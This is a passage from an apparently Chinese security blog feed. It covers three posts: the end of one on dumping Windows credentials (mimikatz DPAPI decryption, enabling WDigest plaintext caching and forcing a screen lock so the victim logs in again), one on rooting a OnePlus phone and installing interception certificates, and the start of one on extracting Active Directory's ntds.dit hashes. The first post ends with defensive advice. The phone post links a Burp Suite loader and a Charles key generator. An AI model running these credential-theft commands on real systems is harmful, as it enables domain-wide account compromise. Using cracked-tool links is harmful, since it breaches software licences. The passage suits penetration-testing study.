href="#6、利用MasterKey解密" class="headerlink" title="6、利用MasterKey解密"></a>6、利用MasterKey解密</h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">dpapi:</span>:cred /in:FF<span class="hljs-number">22</span>A<span class="hljs-number">1</span>FDA<span class="hljs-number">68</span>FD<span class="hljs-number">8515</span>B<span class="hljs-number">52</span>C<span class="hljs-number">534E8655421</span><br>/masterkey:b<span class="hljs-number">3354</span><span class="hljs-keyword">c</span><span class="hljs-number">56</span>cd<span class="hljs-number">35630</span>d<span class="hljs-number">10</span>aa<span class="hljs-number">7477</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>d<span class="hljs-number">16e9</span>b<span class="hljs-number">94587</span>f<span class="hljs-number">1</span>dc<span class="hljs-number">6</span>f<span class="hljs-number">9</span>d<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span>fcb<span class="hljs-number">72</span>a<span class="hljs-number">5e4</span>a<span class="hljs-number">25</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span>aab<span class="hljs-number">8</span>fa<span class="hljs-number">242194666</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span><span class="hljs-keyword">cc</span><span class="hljs-number">4</span>be<span class="hljs-number">9</span><br><span class="hljs-number">485</span><span class="hljs-keyword">c</span><span class="hljs-number">31</span>af<span class="hljs-number">555</span>b<span class="hljs-number">01</span>a<span class="hljs-number">49</span>abbfbb<span class="hljs-number">8</span><span class="hljs-keyword">cc</span><span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">00</span>d<span class="hljs-number">209</span>da<span class="hljs-number">624</span>f<span class="hljs-number">33</span><span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651061.png" alt="image.png"></p><h2 id="Windows-2012R2之后抓取密码的方式"><a href="#Windows-2012R2之后抓取密码的方式" class="headerlink" title="Windows-2012R2之后抓取密码的方式"></a>Windows-2012R2之后抓取密码的方式</h2><p>在Windows2012系统及以上的系统，默认在内存缓存中禁止保存明文密码的。攻击者可以通过修改注册表的方式抓取明文，需要用户重新登录后才能成功抓取<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651069.png" alt="image.png"></p><h3 id="修改注册表和锁屏"><a href="#修改注册表和锁屏" class="headerlink" title="修改注册表和锁屏"></a>修改注册表和锁屏</h3><p>修改注册表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v<br>UseLogonCredential /t REG_DWORD /d 1 /f 开启<br>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v<br>UseLogonCredential /t REG_DWORD /d 0 /f 关闭<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651094.png" alt="image.png"><br>然后让他锁屏，当他再次输入密码的时候我们再次抓取密码就可以抓取到明文密码了</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">rundll32.exe user32.dll,LockWorkStation 锁屏<br>query <span class="hljs-keyword">user</span> <span class="hljs-title">查询登录</span><br><span class="hljs-title">logoff</span> ID 下载<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651138.png" alt="image.png"></p><h3 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h3><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651387.png" alt="image.png"></p><h2 id="Windows抓密码防范措施"><a href="#Windows抓密码防范措施" class="headerlink" title="Windows抓密码防范措施"></a>Windows抓密码防范措施</h2><h3 id="2012R2域控设置"><a href="#2012R2域控设置" class="headerlink" title="2012R2域控设置"></a>2012R2域控设置</h3><p>在windows server 2012 R2中，新增了一个Protected Users 安全组，将用户加入到该组，用户的明文密码就不会被获取<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651469.png" alt="image.png"></p><h3 id="安装KB2871997"><a href="#安装KB2871997" class="headerlink" title="安装KB2871997"></a>安装KB2871997</h3><p>2014年，Microsoft发布了KB2871997补丁，它主要囊括了Windows 8.1和Windows Server 2012 R2中增强的安全保护机制。所以，以往的例如：Windows 7，Windows 8，Windows Server 2008R2和Windows Server 2012也可以更新该补丁后获得上述安全保护机制。该补丁无法阻止”哈希传递“的攻击方式，但其确实有助于是Windows免受一些常见的攻击，例如：明文密码脱取、RDP凭据盗取、盗取本地Administrator账户进行横向移动。<br>修改注册表 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v<br>UseLogonCredential /t REG_DWORD /d 0 /f 关闭<br></code></pre></td></tr></table></figure><h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>手机root与抓包笔记</title>
    <link href="/2025/01/06/%E6%89%8B%E6%9C%BAroot%E4%B8%8E%E6%8A%93%E5%8C%85%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/01/06/%E6%89%8B%E6%9C%BAroot%E4%B8%8E%E6%8A%93%E5%8C%85%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="一、root步骤"><a href="#一、root步骤" class="headerlink" title="一、root步骤"></a><strong>一、root步骤</strong></h1><p>手机型号：一加9</p><p>安卓版本：安卓13</p><h2 id="1-打开开发者模式"><a href="#1-打开开发者模式" class="headerlink" title="1. 打开开发者模式"></a>1. <strong>打开开发者模式</strong></h2><p>关于本机&#x3D;&gt;版本信息&#x3D;&gt;连续点6下版本号</p><p>这里顺便记录下版本号等下需要用到</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650163.png" alt="img"></p><h2 id="2-打开usb调试"><a href="#2-打开usb调试" class="headerlink" title="2. 打开usb调试"></a>2. <strong>打开usb调试</strong></h2><p>设置&#x3D;&gt;其他设置&#x3D;&gt;usb调试</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650167.png" alt="img"></p><h2 id="3-解除bl锁"><a href="#3-解除bl锁" class="headerlink" title="3. 解除bl锁"></a>3. <strong>解除bl锁</strong></h2><p>还是进入开发者选项，打开OEM解锁</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650176.png" alt="img"></p><h2 id="4-下载官方对应上面版本号的rom包，以及root工具"><a href="#4-下载官方对应上面版本号的rom包，以及root工具" class="headerlink" title="4. 下载官方对应上面版本号的rom包，以及root工具"></a>4. <strong>下载官方对应上面版本号的rom包，以及root工具</strong></h2><p><a href="https://yun.daxiaamu.com/OnePlus_Roms/">https://yun.daxiaamu.com/OnePlus_Roms/</a></p><p><a href="https://optool.daxiaamu.com/optool/">https://optool.daxiaamu.com/optool/</a></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650172.png" alt="img"></p><h2 id="5-打开工具后输入1装一加驱动"><a href="#5-打开工具后输入1装一加驱动" class="headerlink" title="5. 打开工具后输入1装一加驱动"></a>5. <strong>打开工具后输入1装一加驱动</strong></h2><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650182.png" alt="img"></p><h2 id="6-解bl锁与root"><a href="#6-解bl锁与root" class="headerlink" title="6. 解bl锁与root"></a>6. <strong>解bl锁与root</strong></h2><p>输入2即可一键解bl锁</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650181.png" alt="img"></p><p>将刚才下好的对应版本号的包拉到与工具相同目录下，后输入3后跟着步骤来即可成功root（这里）</p><p>重启后打开magisk，可以看到成功root</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650580.png" alt="img"></p><h2 id="7-装Lspatch模块"><a href="#7-装Lspatch模块" class="headerlink" title="7. 装Lspatch模块"></a>7. <strong>装Lspatch模块</strong></h2><p>下载安装即可</p><p><a href="https://github.com/LSPosed/LSPatch">https://github.com/LSPosed/LSPatch</a></p><p><a href="https://www.yuque.com/attachments/yuque/0/2024/zip/25663222/1709819933984-545f85c3-dfab-45c5-ac2e-3c54eaca795e.zip">📎LSPosed-v1.9.2-7024-zygisk-release.zip</a></p><h2 id="8-装证书（不用抓包工具可以不看这下面的）"><a href="#8-装证书（不用抓包工具可以不看这下面的）" class="headerlink" title="8.装证书（不用抓包工具可以不看这下面的）"></a><strong>8.装证书（不用抓包工具可以不看这下面的）</strong></h2><p>这里装证书有个问题，因为高版本安卓想要抓包，就需要把证书装入到系统证书里面，所以我们就需要&#x2F;system的读写权限，但是经过尝试，安卓13 (高版本安卓)想解锁&#x2F;system写权限 较为复杂，短时间应该搞不定。</p><p>经过反复尝试，这里采用FoxMagisk装入插件的方法，来将证书导入到系统库中。</p><h3 id="方法一（无法挂载system分区看这个）"><a href="#方法一（无法挂载system分区看这个）" class="headerlink" title="方法一（无法挂载system分区看这个）"></a>方法一（无法挂载system分区看这个）</h3><h4 id="1-安装FoxMagisk，这里我们下载1-10版本"><a href="#1-安装FoxMagisk，这里我们下载1-10版本" class="headerlink" title="1. 安装FoxMagisk，这里我们下载1.10版本"></a>1. 安装FoxMagisk，这里我们下载1.10版本</h4><p><a href="https://github.com/Fox2Code/FoxMagiskModuleManager">https://github.com/Fox2Code/FoxMagiskModuleManager</a></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650620.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">adb push 包的地址 /sdcard/<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650693.png" alt="img"></p><p>然后再magisk处安装</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650731.png" alt="img"></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650753.png" alt="img"></p><h4 id="2-安装-move-Certificates"><a href="#2-安装-move-Certificates" class="headerlink" title="2.安装 move Certificates"></a>2.安装 move Certificates</h4><p>在右下角搜索 move Certificates，点击安装重启后完成安装</p><p><a href="https://www.yuque.com/attachments/yuque/0/2024/zip/25663222/1709819918393-a9e48cac-5ae5-4dab-95d5-7135c32ca45d.zip">📎Move_Certificates-v1.9.zip</a></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650772.png" alt="img"></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650015.png" alt="img"></p><p>安装之后，我们后续装的证书，在安装后重启手机，就可以成功安装到系统库了。</p><p>这个开启后，理论上后续安装的所有证书都会直接安装到系统库，可能存在一些安全问题,建议只在测试机去搞。</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650077.png" alt="img"></p><p>这里手机在已经加入系统证书后，手机关机或重启可能需要重新装证书，手机里存两张常用抓包软件的证书不要更改即可。</p><h3 id="方法二（有system挂载）"><a href="#方法二（有system挂载）" class="headerlink" title="方法二（有system挂载）"></a>方法二（有system挂载）</h3><p>正常导出证书然后改名字导入系统库即可</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650103.png" alt="img"></p><p>openssl x509 -inform PEM -subject_hash_old -in charles-ssl-proxying-certificate.pem</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650315.png" alt="img"></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650368.png" alt="img"></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650439.png" alt="img"></p><h1 id="二、-遇到的一些问题"><a href="#二、-遇到的一些问题" class="headerlink" title="二、 遇到的一些问题"></a>二、 <strong>遇到的一些问题</strong></h1><p>这里记录一下过程中遇到的问题，有些问题并没有完全解决，简单记录下，后续有机会解决了再补充进来。</p><h3 id="问题一-fastboot识别不到设备"><a href="#问题一-fastboot识别不到设备" class="headerlink" title="问题一 fastboot识别不到设备"></a><strong>问题一 fastboot识别不到设备</strong></h3><p>解决方法：电脑装手机驱动</p><h3 id="问题二-root后无法挂载-system分区装证书（主要是装burp证书能用到）"><a href="#问题二-root后无法挂载-system分区装证书（主要是装burp证书能用到）" class="headerlink" title="问题二 root后无法挂载&#x2F;system分区装证书（主要是装burp证书能用到）"></a><strong>问题二 root后无法挂载&#x2F;system分区装证书（主要是装burp证书能用到）</strong></h3><p>目前已知解决方式</p><h4 id="1-装twrp，用twrp去挂载（可成功，时间长）"><a href="#1-装twrp，用twrp去挂载（可成功，时间长）" class="headerlink" title="1. 装twrp，用twrp去挂载（可成功，时间长）"></a>1. <strong>装twrp，用twrp去挂载（可成功，时间长）</strong></h4><p>实测下载twrp在高版本安卓会闪退，上次搞是降级安卓版本然后去装的twrp，方式是可行的，但需要花多一点的时间去研究下。</p><h4 id="2-网上的各种指令（低版本可成功，高版本未成功）"><a href="#2-网上的各种指令（低版本可成功，高版本未成功）" class="headerlink" title="2. 网上的各种指令（低版本可成功，高版本未成功）"></a>2. <strong>网上的各种指令（低版本可成功，高版本未成功）</strong></h4><p>经实测，命令没见到能直接挂载的。</p><h4 id="3-修改手机的默认配置文件（低版本可成功，高版本未成功）"><a href="#3-修改手机的默认配置文件（低版本可成功，高版本未成功）" class="headerlink" title="3. 修改手机的默认配置文件（低版本可成功，高版本未成功）"></a>3. <strong>修改手机的默认配置文件（低版本可成功，高版本未成功）</strong></h4><p>在低版本成功过，之前一加system挂载就是通过这种方式解决的。</p><h4 id="4-FoxMagisk-movecertificates（只需要system装证书的话首推这个）"><a href="#4-FoxMagisk-movecertificates（只需要system装证书的话首推这个）" class="headerlink" title="4. FoxMagisk+movecertificates（只需要system装证书的话首推这个）"></a>4. <strong>FoxMagisk+movecertificates（只需要system装证书的话首推这个）</strong></h4><p>方便又快捷（详见上文）</p><h3 id="问题三-半黑砖的补救方法"><a href="#问题三-半黑砖的补救方法" class="headerlink" title="问题三 半黑砖的补救方法"></a><strong>问题三 半黑砖的补救方法</strong></h3><p>在装twrp时候装失败了，这时候显示这个界面</p><p>刷失败了，半黑砖了</p><p>这个时候不要慌，先试一下长按各种组合的按键，一般新手机如果不是固件坏了，或者直接删掉重要分区，一般不会黑砖，能进fastboot一般都能救。</p><p>fastboot也进不去，可以考虑挂一下咸鱼卖了回回血。</p><p>如何重启 排除法：</p><ol><li>长按电源键()</li><li>电源+上键（重启了）</li></ol><h1 id="三、app抓包所需工具"><a href="#三、app抓包所需工具" class="headerlink" title="三、app抓包所需工具"></a>三、app抓包所需工具</h1><p> Charles+burp+proxyDroid</p><p>Charles：<a href="https://www.charlesproxy.com/">https://www.charlesproxy.com/</a></p><p>burp：<a href="https://portswigger.net/burp">https://portswigger.net/burp</a></p><p>burp注册机：<a href="https://www.yuque.com/attachments/yuque/0/2023/zip/25663222/1700975924704-87a6d414-1ef3-48bf-8dd7-5917befc8abc.zip">📎burpsuitloader-3.7.17-all.zip</a></p><p>手机代理工具：</p><p><a href="https://www.yuque.com/attachments/yuque/0/2023/zip/25663222/1700659364040-b47eb29d-c262-4b33-8678-56b51d9fbca0.zip">ProxyDroid.apk.1.zip</a></p><h3 id="charles配置"><a href="#charles配置" class="headerlink" title="charles配置"></a>charles配置</h3><h4 id="1-装证书，基础配置"><a href="#1-装证书，基础配置" class="headerlink" title="1.装证书，基础配置"></a>1.装证书，基础配置</h4><p>装证书详细的见上文装证书教程</p><p><a href="https://blog.csdn.net/fuhanghang/article/details/115288277">https://blog.csdn.net/fuhanghang/article/details/115288277</a></p><h4 id="2-charles激活"><a href="#2-charles激活" class="headerlink" title="2.charles激活"></a>2.charles激活</h4><p><a href="https://www.zzzmode.com/mytools/charles/">https://www.zzzmode.com/mytools/charles/</a></p><p>输入name生成key</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650706.png" alt="img"></p><p>返回Charles处激活，我这里已经激活过了，正常未激活状态会让你填name和生成的key</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650782.png" alt="img"></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650834.png" alt="img"></p><h3 id="socks5电脑处代理"><a href="#socks5电脑处代理" class="headerlink" title="socks5电脑处代理"></a>socks5电脑处代理</h3><p>Charles处配置proxy</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650105.png" alt="img"></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650127.png" alt="img"></p><h3 id="sockes5手机处配置"><a href="#sockes5手机处配置" class="headerlink" title="sockes5手机处配置"></a>sockes5手机处配置</h3><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650138.png" alt="img"></p><h3 id="Charles配置代理转发"><a href="#Charles配置代理转发" class="headerlink" title="Charles配置代理转发"></a>Charles配置代理转发</h3><p>Proxy&#x3D;&gt;External Proxy Settings</p><p>设置将流量转发至8080端口</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650275.png" alt="img"></p><p>打开burp，监听8080端口</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061650523.png" alt="img"></p><p>然后就可以抓包了</p><p><img src="/%E6%89%8B%E6%9C%BAroot&app%E6%8A%93%E5%8C%85%E7%AC%94%E8%AE%B0.assets/1700977486300-e62dc881-482b-4b00-a5cb-ba7cfe82f532.png" alt="img"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>域控安全与跨域攻击</title>
    <link href="/2025/01/06/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/"/>
    <url>/2025/01/06/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="域控安全与跨域攻击"><a href="#域控安全与跨域攻击" class="headerlink" title="域控安全与跨域攻击"></a>域控安全与跨域攻击</h1><h2 id="ntds-dit文件的介绍"><a href="#ntds-dit文件的介绍" class="headerlink" title="ntds.dit文件的介绍"></a>ntds.dit文件的介绍</h2><h3 id="Ntds-dit介绍"><a href="#Ntds-dit介绍" class="headerlink" title="Ntds.dit介绍"></a>Ntds.dit介绍</h3><p>ntds.dit为ad的数据库，内容有域用户、域组、用户hash等信息，域控上的ntds.dit只有可以登录到域 </p><p>控的用户（如域管用户、DC本地管理员用户）可以访问。ntds.dit包括三个主要表：数据表、链接表、 </p><p>sd表。所以只要在域渗透中能够获取到ntds.dit就可以获取到所有域用户的用户名和对应的hash，它和 </p><p>SAM文件一样，被windows系统锁死 </p><h3 id="Ntds-dit位置"><a href="#Ntds-dit位置" class="headerlink" title="Ntds.dit位置"></a>Ntds.dit位置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">C:\Windows\NTDS<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649894.png" alt="img"></p><h2 id="多种方式提取和移动ntds-dit文件"><a href="#多种方式提取和移动ntds-dit文件" class="headerlink" title="多种方式提取和移动ntds.dit文件"></a>多种方式提取和移动ntds.dit文件</h2><h3 id="ntdsutils-exe提取ntds-dit"><a href="#ntdsutils-exe提取ntds-dit" class="headerlink" title="ntdsutils.exe提取ntds.dit"></a>ntdsutils.exe提取ntds.dit</h3><p>ntdsutils.exe是一个为活动目录提供管理机制的命令行工具，使用 ntdsutils.exe可以维护和管理 活动目录数据库、控制单个主机操作、创建应用程序目录分区等，该工具默认安装在域控服务器上，可 以在域控制器上直接操作，支持windows server 2003、2008、2012。提取过程分为3步：</p><p>第一步：创建快照</p><p>可以看到快照的uid是738aac0f-ee3c-4da1-993a-c6b8f3868120</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ntdsutil.exe snapshot &quot;activate instance ntds&quot; create q q<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649904.png" alt="img"></p><p>第二步：加载快照</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ntdsutil.exe snapshot &quot;mount &#123;738aac0f-ee3c-4da1-993a-c6b8f3868120&#125;&quot; q q<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649907.png" alt="img"></p><p>可以看到快照的地址为C:$SNAP_202403251747_VOLUMEC$\</p><p>第三步：复制快照中的ntds.dit文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">copy &#x27;快照地址\Windows\NTDS\ntds.dit&#x27; 目标地址<br>copy C:\$SNAP_202403251747_VOLUMEC$\Windows\NTDS\ntds.dit C:\Users\admins\Desktop\ntds\ntds.dit<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649910.png" alt="img"></p><p>第四部：删除快照</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ntdsutil.exe snapshot &quot;umount &#123;993a6c93-7886-43a4-8b4b-467d8ace1942&#125;&quot; &quot;delete &#123;993a6c93-7886-43a4-8b4b-467d8ace1942&#125;&quot; q q<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649909.png" alt="img"></p><h3 id="vssadmin提取ntds-dit"><a href="#vssadmin提取ntds-dit" class="headerlink" title="vssadmin提取ntds.dit"></a>vssadmin提取ntds.dit</h3><p>vssadmin1是Windows Server 2008及Windows 7系统提供的VSS管理工具，它可以用于创建或删除卷 影副本，列出卷影副本的信息（只能管理系统Provider创建的卷影副本）。还可以用于显示所有安装的 所有卷影副本写入程序（writers）和提供程序（providers），以及改变卷影副本存储空间（即所谓的  “diﬀ空间” ）的大小等。支持的操作系统：  Server 2008、Server 2012</p><p>第一步：创建快照</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ssadmin create shadow /for=c:<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649915.png" alt="img"></p><p>第二步：复制文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\NTDS\ntds.dit C:\Users\admins\Desktop\ntds\ntds.dit<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649202.png" alt="img"></p><p>第三步：删除快照</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">vssadmin delete shadows /for=c: /quiet<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649216.png" alt="img"></p><h3 id="vssown提取ntds-dit"><a href="#vssown提取ntds-dit" class="headerlink" title="vssown提取ntds.dit"></a>vssown提取ntds.dit</h3><p>vssown.vbs和vssadmin类似，它是由Tim Tomes开发完成的，它可以创建和删除卷影副本，以及启动 和停止卷影复制服务</p><p>第一步：启动卷影复制服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cscript vssown.vbs /start<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649226.png" alt="img"></p><p>第二步：创建一个C盘的卷影副本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cscript vssown.vbs /create c<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649235.png" alt="img"></p><p>第三步：列出当前卷影副本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cscript vssown.vbs /list<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649250.png" alt="img"></p><p>第四步：复制文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\ntds\ntds.dit<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649273.png" alt="img"></p><p>第五步：删除卷影副本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cscript vssown.vbs /delete &#123;B267559B-57D8-4D59-B77F-890CF57BA448&#125;<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649463.png" alt="img"></p><h3 id="IFM"><a href="#IFM" class="headerlink" title="IFM"></a>IFM</h3><p>可以通过创建一个IFM 的方式获取ntds.dit，在使用 ntdsutil 创建媒体安装集（IFM）时，需要进行生 成快照、加载、将ntds.dit 和计算机的SAM 文件复制到目标文件夹中等操作，这些操作也可以通过    PowerShell 或VMI 远程执行。</p><p>第一步：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot; q q<br></code></pre></td></tr></table></figure><p>此时ntds.dit 将被保存在C:\test\Active Directory 下， SYSTEN 和SECURITY 两个文件将被保存在 C:\test\registry 文件夹下</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649479.png" alt="img"></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649531.png" alt="img"></p><p>第二步：删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">rmdir /s/q C:\test<br></code></pre></td></tr></table></figure><h3 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h3><p>通过impacket 里的secretsdump.py 脚本可以直接远程读取ntds.dit 并导出哈希值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">secretsdump.exe 域名/administrator:密码@IP -outputfile output_ntds<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649542.png" alt="img"></p><h2 id="离线方式读取ntds-dit文件"><a href="#离线方式读取ntds-dit文件" class="headerlink" title="离线方式读取ntds.dit文件"></a>离线方式读取ntds.dit文件</h2><p>离线一般需要两步：</p><p>1、将远端域控的ntds.dit下载到本地，</p><p>2、然后利用再在本地进行。</p><p>注意：因为system.hive 里存放着ntds.dit 的秘钥，所以需要转储system.hive ，不然没法查看ntds.dit 里内容</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">reg save hklm\system c:\windows\temp\system.hive<br></code></pre></td></tr></table></figure><p>下面介绍几种方式离线读取ntds.dit文件</p><h3 id="esedbexport"><a href="#esedbexport" class="headerlink" title="esedbexport"></a>esedbexport</h3><p>1、我么以kali为例子，安装esedbexport</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">apt-get install autoconf automake autopoint libtool pkg-config<br>wget https://github.com/libyal/libesedb/releases/download/20210424/libesedb- experimental-20210424.tar.gz<br>tar zxvf libesedb-experimental-20210424.tar.gz<br>cd libesedb-20210424<br>./configure<br>make<br>make install<br>ldconfig<br></code></pre></td></tr></table></figure><p>2、导出 ntds.dit，两个重要的表为：  datatable以及link_table，他们都会被存放在.&#x2F;ntds.dit.export&#x2F;文 件夹中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">esedbexport -m tables ntds.dit<br></code></pre></td></tr></table></figure><p>3、安装ntdsxtract</p><figure class="highlight plaintext"><table><tr><td 